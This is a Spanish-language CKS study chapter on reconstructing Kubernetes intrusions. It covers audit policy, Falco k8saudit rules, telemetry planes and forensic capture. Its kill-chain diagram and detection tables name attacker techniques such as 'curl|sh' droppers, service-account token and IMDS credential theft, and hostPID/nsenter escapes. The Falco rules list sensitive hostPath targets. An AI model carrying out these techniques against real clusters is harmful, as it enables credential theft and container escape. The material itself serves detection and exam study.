# 6.3 Investigar e identificar fases de ataque y actores maliciosos dentro del entorno

**CKS v1.34 — Dominio 6: Monitoring, Logging and Runtime Security · Peso del subtema: 4**

---

## 1. Motivación y el problema arquitectónico en producción

### 1.1 La asimetría que vuelve difícil reconstruir una intrusión en Kubernetes

Un host Linux clásico le entrega al investigador una narrativa autoritativa: `/var/log/auth.log`, `auditd`, el historial de shell, las marcas de tiempo del sistema de archivos y un hostname estable que mapea a un activo físico. Kubernetes destruye cada una de esas suposiciones:

| Ancla forense tradicional | Qué le hace Kubernetes |
|---|---|
| Hostname estable → activo | Los nombres de Pod son efímeros, se regeneran en cada rollout del ReplicaSet |
| Disco duradero del cual sacar una imagen | El rootfs del contenedor es un overlayfs que desaparece al reiniciar por `CrashLoopBackOff` |
| `last`, `wtmp`, historial de shell | Sin shell, sin PAM, sin TTY en un contenedor distroless; `kubectl exec` esquiva todo eso |
| IP estática → identidad | El IPAM del CNI recicla IPs de pods en minutos; la misma `10.244.3.17` puede ser tres cargas de trabajo en una hora |
| Modelo de privilegios local | La autorización ocurre en el API server, a miles de syscalls de distancia del host que ejecuta el trabajo |
| Árbol de procesos desde PID 1 | Los namespaces de PID implican que el host ve un PID distinto del que ve el contenedor |

La consecuencia es arquitectónica, no operativa: **ninguna fuente de telemetría por sí sola puede reconstruir una intrusión en Kubernetes.** El plano de control sabe *quién pidió* pero no *qué se ejecutó*. El kernel sabe *qué se ejecutó* pero no *quién lo autorizó*. El CNI sabe *qué habló con qué* pero no conoce ni identidad ni intención. La investigación es fundamentalmente un **problema de correlación entre al menos cuatro planos independientes**, unidos por claves inestables (UID del pod, ID del contenedor, nombre del nodo, timestamp).

### 1.2 El dwell time es la métrica que realmente importa

La razón por la que el temario de CKS ubica este subtema en el dominio de seguridad en runtime es que la prevención tiene un techo duro. Pod Security Admission, seccomp, AppArmor, la firma de imágenes y las NetworkPolicies elevan el costo de la intrusión; no lo llevan a cero. Una vez que una carga de trabajo con una imagen legítima y firmada se compromete a través de una falla de capa de aplicación (bug de deserialización, SSRF, backdoor en una dependencia), todos los controles preventivos ya votaron "permitir". Lo que queda es el ciclo **detectar → investigar → contener**, y ahí el único número que importa es el **dwell time**: el intervalo entre el acceso inicial y la primera acción del defensor.

El objetivo arquitectónico para un clúster productivo:

```
Initial access ──► Detection signal        target ≤   60 s   (runtime sensor)
Detection      ──► Triage decision         target ≤  300 s   (correlated timeline)
Triage         ──► Containment             target ≤  600 s   (quarantine + evidence)
Containment    ──► Root cause              target ≤   24 h   (forensic artifacts)
```

Todo en este capítulo existe para volver alcanzables esos cuatro números, y cada uno de ellos falla por una razón arquitectónica *distinta*:

- La detección falla cuando el sensor de runtime no tiene una regla para la técnica, o cuando el sensor no está en ese nodo.
- El triage falla cuando los audit logs son solo de nivel `Metadata` y no se puede ver qué cuerpo de objeto envió el atacante.
- La contención falla cuando el procedimiento de cuarentena destruye la evidencia (eliminar el pod).
- La causa raíz falla cuando el rootfs del contenedor fue recolectado por el garbage collector antes de capturarlo.

### 1.3 Modelar al adversario en fases, no en alertas

Una alerta es un punto. Una intrusión es una trayectoria. Si la metodología de investigación es "mirar la alerta", se contendrá un síntoma y el actor quedará residente. La forma estándar de la industria para forzar el pensamiento en trayectorias es mapear cada observación a una **fase de la kill chain** y luego preguntar: *¿qué tuvo que pasar antes de esto, y qué va a pasar después?*

Hay tres modelos relevantes, y un candidato a CKS debería saber a cuál recurrir:

| Modelo | Granularidad | Ajuste a Kubernetes | Mejor uso |
|---|---|---|---|
| **Lockheed Martin Cyber Kill Chain** (7 fases) | Gruesa, centrada en el perímetro | Pobre — asume una intrusión de afuera hacia adentro, sin noción de orquestador | Narrativa ejecutiva, ejercicios de mesa |
| **MITRE ATT&CK for Containers** (matriz `containers`) | Nivel de técnica (IDs Txxxx) | Bueno — cubre runtime de contenedores + orquestador | Ingeniería de detección, análisis de brechas de cobertura de reglas |
| **Microsoft Threat Matrix for Kubernetes** | Nivel de técnica, nativa de K8s | El mejor — nombra explícitamente el robo de kubeconfig, la inyección de sidecars, el envenenamiento de CoreDNS, hostPath escribible | Modelado de amenazas específico de Kubernetes y diseño de audit policy |

En la práctica se usa ATT&CK como taxonomía (porque Falco, Tetragon y todos los SIEM etiquetan reglas con `TXXXX`) y la matriz de Microsoft como checklist de brechas de cobertura específicas de Kubernetes.

### 1.4 La ruta de ataque canónica en Kubernetes

Casi todo compromiso real de Kubernetes sigue este esqueleto. Memorizalo — investigar es el acto de encontrar la evidencia de cada salto, en orden:

```
 ┌──────────────────────────────────────────────────────────────────────────┐
 │ 1. INITIAL ACCESS      Exploit a public-facing app (T1190)               │
 │                        └─► RCE inside container `app`                    │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 2. EXECUTION           Spawn a shell / download tooling (T1059)          │
 │                        └─► curl|sh, busybox, nc, base64-decoded dropper  │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 3. DISCOVERY           Read the environment (T1613, T1046, T1552.007)    │
 │                        └─► /var/run/secrets/.../token, env, 169.254.169.254│
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 4. CREDENTIAL ACCESS   Steal SA token / cloud IMDS creds (T1528, T1552)  │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 5. LATERAL MOVEMENT    Use token against kubernetes.default.svc          │
 │                        └─► list secrets, exec into other pods            │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 6. PRIVILEGE ESC.      Escape to host (T1611) or create privileged pod   │
 │                        └─► hostPID + nsenter, hostPath /, CAP_SYS_ADMIN  │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 7. PERSISTENCE         Static pod on node, CronJob, mutating webhook,    │
 │                        ClusterRoleBinding, implanted image (T1525)       │
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 8. DEFENSE EVASION     Kill Falco, clear audit log, delete Events (T1562)│
 ├──────────────────────────────────────────────────────────────────────────┤
 │ 9. IMPACT              Cryptomining, data exfil, resource hijack (T1496) │
 └──────────────────────────────────────────────────────────────────────────┘
```

Dos propiedades de esta ruta gobiernan toda la arquitectura de detección:

- **Las fases 1–4 son invisibles para el API server.** Ocurren enteramente dentro de un contenedor. Solo un sensor de runtime a nivel de kernel las ve.
- **Las fases 5–8 son en gran medida invisibles para el sensor de kernel del nodo víctima.** Son llamadas a la API, visibles solo en el audit log — y posiblemente ejecutadas desde *otro* nodo o desde fuera del clúster.

Por eso el audit log y el sensor de runtime no son alternativas. Son las dos mitades de un mismo instrumento.

---

## 2. Comparativas técnicas y tablas de compromisos

### 2.1 Los cuatro planos de telemetría

| Plano | Fuente | Ve | No puede ver | Latencia | Volumen (prod de 100 nodos) | Resistencia a manipulación |
|---|---|---|---|---|---|---|
| **Audit del plano de control** | Backend de auditoría del `kube-apiserver` | Toda petición autenticada a la API: identidad, verbo, recurso, IP de origen, decisión RBAC, opcionalmente los cuerpos completos de request/response | Cualquier cosa que no pase por el API server: ejecución dentro del contenedor, comandos locales del nodo, acceso directo a etcd o al kubelet | ~ms (log), ~s (lote del webhook) | 2–20 GB/día en `Metadata`, 50–400 GB/día en `RequestResponse` | Media — archivo en el nodo del plano de control, borrable por un atacante con root; alta si se envía fuera del clúster |
| **Runtime / syscall** | Falco, Tetragon, Tracee (eBPF o kmod) | `execve`, `open`, `connect`, `ptrace`, cambios de namespace, escrituras de archivos, primitivas de escape de contenedor | Intención, contexto de autorización, contenido de payloads cifrados | <1 s | 1–5 GB/día filtrado; 100× eso sin filtrar | Media — un atacante con root en el host puede descargar la sonda (lo cual es en sí mismo un evento detectable) |
| **Flujo de red** | Cilium Hubble, logs de flujo del CNI, telemetría de service mesh | L3/L4 (y L7 con mesh/Hubble) con identidad de pod, consultas DNS, veredictos de política | El payload de TLS, tráfico de host-network si se evita el CNI | <1 s | 5–50 GB/día | Media |
| **SO del host** | `auditd`, journald, log del kubelet, log del runtime de contenedores | Actividad de procesos/archivos/red a nivel de nodo, incluyendo todo lo que ocurre fuera de un contenedor, llamadas a la API del kubelet, pulls de imágenes | Mapeo a identidad de Kubernetes sin enriquecimiento | ~s | 1–10 GB/día | Baja localmente, alta si se envía fuera |

**Regla arquitectónica:** una estrategia de detección que cubre menos de tres de estos planos tiene un punto ciego estructural que un atacante puede ocupar indefinidamente.

### 2.2 Audit policy: niveles y stages

El nivel de auditoría, por regla, decide cuánto del evento se registra. Es la palanca costo/visibilidad más grande del clúster.

| Nivel | Registra | Bytes/evento (típico) | Valor investigativo | Uso correcto |
|---|---|---|---|---|
| `None` | Nada — evento suprimido | 0 | — | Ruido de alto volumen: `get`/`watch` sobre `endpoints`, `leases`, `events`; sondas de healthz |
| `Metadata` | Quién, cuándo, qué, desde dónde, decisión RBAC — sin cuerpos | ~700 B | Responde "quién tocó qué" | Por defecto para todos los verbos de lectura, y el piso para todo lo demás |
| `Request` | Metadata + cuerpo de la petición | 2–20 KB | Muestra exactamente qué *envió* el atacante (el pod spec malicioso) | `create`/`update`/`patch`/`delete` sobre cargas de trabajo, RBAC, webhooks |
| `RequestResponse` | Metadata + cuerpo de petición + cuerpo de respuesta | 4–100 KB | Muestra qué *recibió* el atacante (el valor del secret, el token) | `secrets` (con cuidado), `pods/exec`, objetos RBAC, `certificatesigningrequests` |

> **Trampa:** `RequestResponse` sobre `secrets` escribe el material del secret en base64 dentro del audit log. Eso convierte el audit log en un almacén de credenciales. El valor por defecto defendible es `Metadata` en `secrets` — la señal que se necesita es el *acceso*, no el valor. Usá `RequestResponse` sobre secrets solo en una regla acotada a un namespace y con un destino endurecido fuera del clúster.

Los stages controlan *cuándo* se emite un evento:

| Stage | Se emite cuando | Por qué importa |
|---|---|---|
| `RequestReceived` | Inmediatamente al recibirla, antes de procesarla | Duplica el volumen de log; casi siempre va en `omitStages`. Su único valor es detectar peticiones que hicieron caer al API server |
| `ResponseStarted` | Se enviaron las cabeceras de respuesta — solo peticiones de larga duración (`watch`, `exec`, `portforward`) | **Crítico.** Una sesión de `kubectl exec` que nunca termina solo produce este stage |
| `ResponseComplete` | La respuesta terminó | El stage de trabajo; lleva `responseStatus.code` |
| `Panic` | El handler entró en pánico | Raro; potencial explotación del propio API server |

> **Sutileza relevante para el examen:** si ponés `omitStages: ["ResponseStarted"]` vas a perder visibilidad sobre sesiones activas de `exec` y `port-forward` que sobrevivan a la ventana de log. Omití `RequestReceived`, nunca `ResponseStarted`.

### 2.3 Backends de auditoría

| | `--audit-log-path` (backend de log) | `--audit-webhook-config-file` (backend de webhook) |
|---|---|---|
| Entrega | Append a un archivo en el nodo del plano de control | HTTP POST de un `EventList` a un endpoint remoto |
| Modo de fallo | Disco lleno → el API server **bloquea/falla escrituras** (la auditoría está en la ruta de la petición) | Endpoint caído → depende del modo; `batch` almacena en buffer y luego descarta |
| Modos | n/a (bloqueante por construcción) | `batch` (asíncrono, con buffer), `blocking` (espera por petición), `blocking-strict` (también bloquea en `RequestReceived`) |
| Latencia añadida | µs | 0 en `batch`; ida y vuelta completa en `blocking` |
| Resistencia a manipulación | Baja — root en el nodo puede hacer `truncate audit.log` | Alta — los datos ya salieron del nodo |
| Garantía de orden | Estricta | Por lotes, puede reordenar |
| Carga operativa | Rotación de logs, agente de envío, dimensionado de disco | HA del endpoint, TLS, ajuste de backpressure |
| Elección típica en producción | Ambos: archivo para forense local + un shipper `Fluent Bit`/`Vector`, **o** archivo + webhook al plugin `k8saudit` de Falco | |

Flags clave de ajuste del webhook (`kube-apiserver`):

```
--audit-webhook-mode=batch
--audit-webhook-batch-max-size=400
--audit-webhook-batch-max-wait=30s
--audit-webhook-batch-throttle-qps=10
--audit-webhook-batch-throttle-burst=15
--audit-webhook-initial-backoff=10s
--audit-webhook-truncate-enabled=true
--audit-webhook-truncate-max-batch-size=10485760
--audit-webhook-truncate-max-event-size=102400
```

> **Compromiso de disponibilidad que hay que enunciar explícitamente en una revisión de diseño:** `blocking-strict` significa *si el destino de auditoría no está disponible, el clúster deja de aceptar peticiones a la API*. Esa es la elección correcta solo donde un regulador exige "ninguna acción sin registrar". Para todo lo demás, `batch` más un archivo local duradero es la respuesta correcta.

### 2.4 Drivers del sensor de runtime (Falco)

| Driver | Mecanismo | Requisito de kernel | Overhead de rendimiento | Amigable con contenedores | Notas |
|---|---|---|---|---|---|
| **eBPF moderno (CO-RE)** | eBPF, compile-once-run-everywhere | ≥ 5.8 con BTF | El más bajo | Sí — sin toolchain de compilación en el host | **Recomendación por defecto** para cualquier distro reciente |
| **Sonda eBPF (legacy)** | `.o` precompilado descargado por `falcoctl` | ≥ 4.14 | Bajo | Sí | Alternativa para kernels previos a BTF |
| **Módulo de kernel** | `falco.ko` fuera del árbol | Headers de kernel coincidentes | El más bajo en bruto, pero con riesgo dentro del kernel | No — requiere DKMS/headers en el host | Bloqueado por Secure Boot; un pánico del módulo tumba el nodo |
| **Solo userspace / plugin** | Sin fuente de syscalls; solo plugins (`k8saudit`, `cloudtrail`) | Ninguno | Despreciable | Sí | El modo usado para un despliegue de Falco que consume **únicamente** el stream de auditoría de Kubernetes |

### 2.5 Herramientas de detección en runtime

| | **Falco** | **Tetragon** | **Tracee** | **auditd** |
|---|---|---|---|---|
| Proyecto / gobernanza | CNCF Graduated | CNCF (Cilium) | Aqua, CNCF Sandbox | Userland del kernel Linux |
| Sensor | kmod / eBPF | eBPF | eBPF | Subsistema de auditoría del kernel |
| Lenguaje de políticas | YAML de reglas de Falco (`condition`, `output`, `priority`) | CRD `TracingPolicy` (kprobe/tracepoint/LSM) | Firmas (Rego/Go) + CRD de política | Reglas de `auditctl` |
| **Aplicación (kill/block)** | No (solo detección; `falco-talon` como responder aparte) | **Sí** — acciones `SigKill`, `Override` dentro del kernel | Limitada | No |
| Enriquecimiento con identidad K8s | Runtime de contenedores + plugin `k8smeta` | Nativo (identidad de Cilium) | Sí | Ninguno — necesita correlación externa |
| Ingesta del audit log | Sí — plugin `k8saudit` | No | No | No |
| Etiquetado ATT&CK en el ruleset incluido | Extenso (tags `mitre_*`) | Políticas de la comunidad | Metadatos de firma | Ninguno |
| Overhead a 5k syscalls/s | ~2–4 % CPU/nodo | ~1–3 % | ~2–5 % | 5–15 % (alto, más contención de locks) |
| Mejor en | Detección amplia y curada lista para usar + correlación con auditoría | Observabilidad de procesos/archivos/red de bajo overhead **con** prevención dentro del kernel | Investigación profunda de firmas | Mandatos de cumplimiento a nivel de host |

**Postura práctica para un SRE:** desplegar Falco con el plugin `k8saudit` como capa primaria de detección y correlación (es la única de las cuatro que une nativamente eventos de runtime y del plano de control), y añadir Tetragon donde se necesite aplicación dentro del kernel o telemetría de procesos de altísima cardinalidad a costo mínimo.

### 2.6 Fase de ataque → telemetría → artefacto → respuesta

Esta es la tabla que hay que internalizar. Es el playbook de investigación en una página.

| Fase | ATT&CK | Plano primario | Artefacto concreto a buscar | Primera respuesta |
|---|---|---|---|---|
| Initial Access | T1190 | Logs de la app + red | Petición anómala en el log del ingress; primera salida de red histórica desde el pod | Capturar snapshot del pod, mantenerlo corriendo |
| Execution | T1059 / T1609 | Runtime | `execve` de `sh`/`bash`/`curl`/`wget` en un contenedor cuya imagen no tiene ese entrypoint | Alerta de Falco → abrir incidente |
| Discovery | T1613 / T1046 | Runtime + red | `open` de `/var/run/secrets/kubernetes.io/serviceaccount/token`; patrón de escaneo hacia `10.96.0.0/12`; consulta DNS a `kubernetes.default.svc` | Correlacionar con el audit log por UID del pod |
| Credential Access | T1528 / T1552.007 | Runtime + red | Conexión a `169.254.169.254`; lectura de `~/.kube/config`, `/var/lib/kubelet/pki/` | Rotar el token de la SA, revocar el certificado del nodo |
| Lateral Movement | T1550 | **Audit** | Llamadas a la API por `system:serviceaccount:*` con un `userAgent` que no es el SDK, o con `authentication.kubernetes.io/pod-name` discordante | Restringir RBAC, NetworkPolicy de cuarentena |
| Privilege Escalation | T1611 | Runtime | `setns`/`nsenter`, montaje de `/proc/1/root`, escritura en `/var/lib/kubelet/...`, creación de un contenedor con `hostPID`+`privileged` | Cordonar el nodo, tratar el nodo como comprometido |
| Persistence | T1543.005 / T1525 | Audit + runtime | `create` de `ClusterRoleBinding`, `MutatingWebhookConfiguration`, `CronJob`; escritura de archivo en `/etc/kubernetes/manifests/` | Borrar el artefacto **después** de capturarlo; buscar hermanos |
| Defense Evasion | T1562.001 / T1070 | Runtime + huecos de auditoría | Proceso de Falco matado; `deletecollection` sobre `events`; truncado de `audit.log` (hueco en la continuidad de `auditID`) | Asumir root en el nodo; escalar |
| Impact | T1496 / T1485 | Runtime + red + métricas | 100 % de CPU sostenido, conexiones a puertos de pool de minería (3333/4444/14444), verbos `delete` masivos | Contención total |

### 2.7 Opciones de captura forense

| Método | Fidelidad | Perturbación para el atacante | Preserva memoria | Esfuerzo | Cuándo usarlo |
|---|---|---|---|---|---|
| `kubectl logs --previous` | Baja | Ninguna | No | Trivial | Siempre, primero — los logs mueren con el pod |
| `kubectl cp` desde el pod | Media | Baja (escribe dentro del contenedor) | No | Bajo | Solo si el contenedor tiene `tar` |
| **Contenedor efímero** (`kubectl debug`) | Media-alta | Baja, pero visible para un atacante que esté mirando | Lista de procesos sí, RAM no | Bajo | Triage en vivo de un pod comprometido en ejecución |
| **CRI checkpoint** (API `/checkpoint` del kubelet) | **La más alta** — estado completo del contenedor incluida la memoria | **Ninguna** — el contenedor sigue corriendo | **Sí** | Medio | La respuesta correcta para forense en producción |
| Snapshot de disco/EBS del nodo | Alta para disco | Ninguna | No | Medio | Compromiso a nivel de host |
| Volcado de memoria del nodo (LiME/AVML) | La más alta para el host | Ninguna | Sí (host) | Alto | Sospecha de implante a nivel de kernel |
| Eliminar el pod | **Destruye la evidencia** | Total | No | — | **Nunca como primera acción** |

---

## 3. Manifiestos completos e infraestructura

### 3.1 Audit policy de producción

`/etc/kubernetes/audit/audit-policy.yaml` — una política completa y ordenada. **Las reglas se evalúan de arriba hacia abajo y la primera coincidencia gana**, así que la supresión de ruido debe ir antes que la captura amplia, y la captura de alto valor antes que ambas.

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy

# RequestReceived doubles volume with near-zero investigative value.
# ResponseStarted is deliberately NOT omitted: long-running exec/attach/
# port-forward sessions emit ONLY that stage until they terminate.
omitStages:
  - "RequestReceived"

# Never write managedFields into the audit log; it is pure noise.
omitManagedFields: true

rules:
  # ---------------------------------------------------------------------
  # SECTION A — HIGH VALUE. Full bodies. Must be first.
  # ---------------------------------------------------------------------

  # A1. Interactive access to a workload. The single strongest lateral-
  #     movement and hands-on-keyboard signal in the whole cluster.
  - level: RequestResponse
    verbs: ["create", "get"]
    resources:
      - group: ""
        resources:
          - "pods/exec"
          - "pods/attach"
          - "pods/portforward"
          - "pods/ephemeralcontainers"
          - "nodes/proxy"
          - "services/proxy"
          - "pods/proxy"

  # A2. Authorization changes = persistence and privilege escalation.
  - level: RequestResponse
    verbs: ["create", "update", "patch", "delete", "deletecollection"]
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]

  # A3. Admission control tampering — a mutating webhook is a cluster-wide
  #     implant that survives every pod restart.
  - level: RequestResponse
    resources:
      - group: "admissionregistration.k8s.io"
        resources: ["validatingwebhookconfigurations", "mutatingwebhookconfigurations",
                    "validatingadmissionpolicies", "validatingadmissionpolicybindings"]

  # A4. Certificate issuance — a signed CSR is a durable identity.
  - level: RequestResponse
    resources:
      - group: "certificates.k8s.io"
        resources: ["certificatesigningrequests", "certificatesigningrequests/approval",
                    "certificatesigningrequests/status"]

  # A5. Workload creation: we must be able to read the submitted PodSpec to
  #     prove whether it was privileged, hostPath-mounted or hostPID.
  - level: Request
    verbs: ["create", "update", "patch", "delete"]
    resources:
      - group: ""
        resources: ["pods", "serviceaccounts", "namespaces", "persistentvolumes"]
      - group: "apps"
        resources: ["deployments", "daemonsets", "statefulsets", "replicasets"]
      - group: "batch"
        resources: ["jobs", "cronjobs"]
      - group: "policy"
        resources: ["poddisruptionbudgets"]
      - group: "networking.k8s.io"
        resources: ["networkpolicies", "ingresses"]

  # A6. Anything an anonymous or unauthenticated principal manages to do.
  - level: RequestResponse
    userGroups: ["system:unauthenticated"]

  # ---------------------------------------------------------------------
  # SECTION B — SECRET MATERIAL. Metadata only, on purpose.
  # ---------------------------------------------------------------------

  # B1. WHO read WHICH secret is the signal. The VALUE must never be written
  #     to the audit log — that would turn the log into a credential store.
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]
      - group: ""
        resources: ["serviceaccounts/token"]

  # ---------------------------------------------------------------------
  # SECTION C — NOISE SUPPRESSION. Scoped as narrowly as possible.
  # ---------------------------------------------------------------------

  # C1. Control-plane controllers reading their own coordination objects.
  #     NOTE: this is intentionally limited to get/list/watch. A WRITE by
  #     these identities still falls through to Section D.
  - level: None
    verbs: ["get", "list", "watch"]
    users:
      - "system:kube-controller-manager"
      - "system:kube-scheduler"
      - "system:serviceaccount:kube-system:endpoint-controller"
      - "system:serviceaccount:kube-system:endpointslice-controller"
    resources:
      - group: ""
        resources: ["endpoints", "events", "configmaps"]
      - group: "coordination.k8s.io"
        resources: ["leases"]
      - group: "discovery.k8s.io"
        resources: ["endpointslices"]

  # C2. Kubelet status heartbeats.
  - level: None
    userGroups: ["system:nodes"]
    verbs: ["get", "list", "watch"]
    resources:
      - group: ""
        resources: ["nodes", "nodes/status", "pods", "pods/status"]
      - group: "coordination.k8s.io"
        resources: ["leases"]

  # C3. Unauthenticated health endpoints.
  - level: None
    nonResourceURLs:
      - "/healthz*"
      - "/readyz*"
      - "/livez*"
      - "/version"
      - "/metrics"

  # C4. API discovery.
  - level: None
    nonResourceURLs:
      - "/api*"
      - "/openapi*"
      - "/apis*"

  # ---------------------------------------------------------------------
  # SECTION D — CATCH-ALL. Nothing escapes unlogged.
  # ---------------------------------------------------------------------

  # D1. Every write anywhere gets its body captured.
  - level: Request
    verbs: ["create", "update", "patch", "delete", "deletecollection"]

  # D2. Everything else — every read, every subresource, every group.
  - level: Metadata
```

### 3.2 Static pod del kube-apiserver cableado para auditoría

`/etc/kubernetes/manifests/kube-apiserver.yaml` — los cuatro bloques que deben ser todos consistentes. Que falte cualquiera de ellos deja al API server en `CrashLoopBackOff`, lo que en un clúster con un solo plano de control significa una caída total.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
  namespace: kube-system
  labels:
    component: kube-apiserver
    tier: control-plane
  annotations:
    kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint: 10.0.0.10:6443
spec:
  hostNetwork: true
  priorityClassName: system-node-critical
  containers:
    - name: kube-apiserver
      image: registry.k8s.io/kube-apiserver:v1.34.0
      command:
        - kube-apiserver
        - --advertise-address=10.0.0.10
        - --allow-privileged=true
        - --authorization-mode=Node,RBAC
        - --client-ca-file=/etc/kubernetes/pki/ca.crt
        - --enable-admission-plugins=NodeRestriction
        - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
        - --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt
        - --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key
        - --etcd-servers=https://127.0.0.1:2379
        - --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt
        - --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key
        - --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
        - --secure-port=6443
        - --service-account-issuer=https://kubernetes.default.svc.cluster.local
        - --service-account-key-file=/etc/kubernetes/pki/sa.pub
        - --service-account-signing-key-file=/etc/kubernetes/pki/sa.key
        - --service-cluster-ip-range=10.96.0.0/12
        - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
        - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
        # ---- BLOCK 1: audit configuration -------------------------------
        - --audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml
        - --audit-log-path=/var/log/kubernetes/audit/audit.log
        - --audit-log-format=json
        - --audit-log-maxage=30          # days to retain
        - --audit-log-maxbackup=10       # rotated files kept
        - --audit-log-maxsize=500        # MB before rotation
        - --audit-log-compress=true
        # ---- optional: stream to Falco k8saudit / SIEM -------------------
        - --audit-webhook-config-file=/etc/kubernetes/audit/webhook-kubeconfig.yaml
        - --audit-webhook-mode=batch
        - --audit-webhook-batch-max-size=400
        - --audit-webhook-batch-max-wait=15s
        - --audit-webhook-initial-backoff=10s
        - --audit-webhook-truncate-enabled=true
        - --audit-webhook-truncate-max-event-size=102400
      livenessProbe:
        failureThreshold: 8
        httpGet:
          host: 10.0.0.10
          path: /livez
          port: 6443
          scheme: HTTPS
        initialDelaySeconds: 10
        periodSeconds: 10
        timeoutSeconds: 15
      resources:
        requests:
          cpu: 250m
      volumeMounts:
        - name: ca-certs
          mountPath: /etc/ssl/certs
          readOnly: true
        - name: k8s-certs
          mountPath: /etc/kubernetes/pki
          readOnly: true
        # ---- BLOCK 2: policy mounted READ-ONLY --------------------------
        - name: audit-policy
          mountPath: /etc/kubernetes/audit
          readOnly: true
        # ---- BLOCK 3: log directory mounted READ-WRITE ------------------
        - name: audit-logs
          mountPath: /var/log/kubernetes/audit
          readOnly: false
  volumes:
    - name: ca-certs
      hostPath:
        path: /etc/ssl/certs
        type: DirectoryOrCreate
    - name: k8s-certs
      hostPath:
        path: /etc/kubernetes/pki
        type: DirectoryOrCreate
    # ---- BLOCK 4: hostPath sources ------------------------------------
    - name: audit-policy
      hostPath:
        path: /etc/kubernetes/audit
        type: DirectoryOrCreate
    - name: audit-logs
      hostPath:
        path: /var/log/kubernetes/audit
        type: DirectoryOrCreate
```

Kubeconfig del webhook (`/etc/kubernetes/audit/webhook-kubeconfig.yaml`) — nótese que usa el esquema de *kubeconfig*, con `clusters[].cluster.server` apuntando al destino:

```yaml
apiVersion: v1
kind: Config
clusters:
  - name: falco-k8saudit
    cluster:
      server: http://127.0.0.1:9765/k8s-audit
contexts:
  - name: falco-k8saudit
    context:
      cluster: falco-k8saudit
      user: ""
current-context: falco-k8saudit
users: []
preferences: {}
```

> **Advertencia operativa:** el API server marca este endpoint desde el **namespace de red del host del nodo de plano de control**. Por lo tanto `127.0.0.1:9765` solo funciona si Falco corre como un DaemonSet con `hostNetwork: true` planificado sobre los nodos de plano de control (es decir, que tolere `node-role.kubernetes.io/control-plane:NoSchedule`). Apuntarlo a un Service `ClusterIP` crea una dependencia de arranque: el API server necesita la red para registrar, y la red necesita al API server.

### 3.3 DaemonSet de Falco con el plugin k8saudit (consumidor del stream de auditoría)

Este despliegue consume **únicamente** el webhook de auditoría — sin driver de syscalls. Es el motor de correlación para las fases 5–8.

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: falco
  labels:
    pod-security.kubernetes.io/enforce: privileged
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-k8saudit-config
  namespace: falco
data:
  falco.yaml: |
    # No syscall source in this deployment; plugins only.
    load_plugins: [k8saudit, json]

    plugins:
      - name: k8saudit
        library_path: libk8saudit.so
        init_config:
          maxEventSize: 262144
          webhookMaxBatchSize: 12582912
        open_params: "http://:9765/k8s-audit"
      - name: json
        library_path: libjson.so
        init_config: ""

    rules_files:
      - /etc/falco/k8s_audit_rules.yaml
      - /etc/falco/rules.d

    watch_config_files: true
    priority: notice
    buffered_outputs: false

    json_output: true
    json_include_output_property: true
    json_include_tags_property: true

    stdout_output:
      enabled: true

    http_output:
      enabled: true
      url: "http://falcosidekick.falco.svc.cluster.local:2801/"
      user_agent: "falcosecurity/falco"

    log_level: info
    log_stderr: true
    log_syslog: false

    metrics:
      enabled: true
      interval: 1h
      output_rule: true
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-audit-rules
  namespace: falco
data:
  audit-phases.yaml: |
    - required_engine_version: 0.31.0
    - required_plugin_versions:
        - name: k8saudit
          version: 0.7.0

    # ---- Reusable macros -------------------------------------------------
    - macro: kevt
      condition: (jevt.value[/stage] in ("ResponseComplete","ResponseStarted"))

    - macro: allowed
      condition: (jevt.value[/annotations/authorization.k8s.io~1decision] = "allow")

    - macro: kcreate
      condition: (ka.verb = create)

    - macro: kmodify
      condition: (ka.verb in (create, update, patch))

    - macro: service_account_user
      condition: (ka.user.name startswith "system:serviceaccount:")

    - list: trusted_exec_users
      items: ["system:serviceaccount:kube-system:generic-garbage-collector"]

    # ---- PHASE 5: LATERAL MOVEMENT --------------------------------------
    - rule: K8s Exec By ServiceAccount
      desc: >
        A ServiceAccount (not a human) opened an interactive session into a
        pod. Automation practically never needs exec; this is the strongest
        single indicator of a stolen in-cluster token being used for lateral
        movement.
      condition: >
        kevt and ka.target.subresource in (exec, attach) and allowed
        and service_account_user
        and not ka.user.name in (trusted_exec_users)
      output: >
        Interactive exec by ServiceAccount
        (user=%ka.user.name verb=%ka.verb target=%ka.target.namespace/%ka.target.name
         subresource=%ka.target.subresource cmd=%ka.uri.param[command]
         srcip=%ka.sourceips uri=%ka.uri userAgent=%ka.useragent)
      priority: CRITICAL
      source: k8s_audit
      tags: [k8s, mitre_lateral_movement, T1609]

    # ---- PHASE 6: PRIVILEGE ESCALATION ----------------------------------
    - rule: K8s Privileged Pod Created
      desc: >
        A pod requesting privileged mode, hostPID, hostNetwork or a hostPath
        mount of a sensitive host directory was admitted. Any of these is a
        one-step container escape primitive.
      condition: >
        kevt and ka.target.resource = pods and kcreate and allowed
        and (ka.req.pod.containers.privileged intersects (true)
             or ka.req.pod.host_pid = true
             or ka.req.pod.host_ipc = true
             or ka.req.pod.host_network = true
             or ka.req.pod.volumes.hostpath intersects
                ("/", "/proc", "/var/run/docker.sock", "/var/run/crio/crio.sock",
                 "/run/containerd/containerd.sock", "/etc/kubernetes",
                 "/var/lib/kubelet", "/etc"))
      output: >
        Escape-capable pod admitted
